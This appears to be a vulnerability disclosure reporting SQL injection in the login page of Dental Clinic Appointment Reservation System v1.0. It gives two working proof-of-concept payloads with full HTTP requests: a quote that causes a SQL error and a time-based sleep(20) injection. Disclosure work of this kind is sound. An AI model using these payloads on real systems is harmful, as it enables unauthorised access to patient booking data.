# Dental Clinic Appointment Reservation System v1.0 has SQL injection

BUG_Author:niclo

Vulnerability File: /APR/login.php

POST parameter 'username' exists SQL injection vulnerability

Payload1:username=a'&password=b&submit1=

```
POST /APR/login.php HTTP/1.1
Host: localhost
Content-Length: 31
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/APR/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=k65tutg8g9o2qq8lc3vsi85rn7
Connection: close

username=a'&password=b&submit1=
```

An error occurred in the sql statement

![image](https://github.com/nightcloudos/picture/blob/main/error.png)

Payload2:username=a'%2b(select*from(select(sleep(20)))a)%2b'&password=b&submit1=

```
POST /APR/login.php HTTP/1.1
Host: localhost
Content-Length: 71
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/APR/login.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: PHPSESSID=k65tutg8g9o2qq8lc3vsi85rn7
Connection: close

username=a'%2b(select*from(select(sleep(20)))a)%2b'&password=b&submit1=
```

The server's response time is 20 seconds

![image](https://github.com/nightcloudos/picture/blob/main/twenty.png)
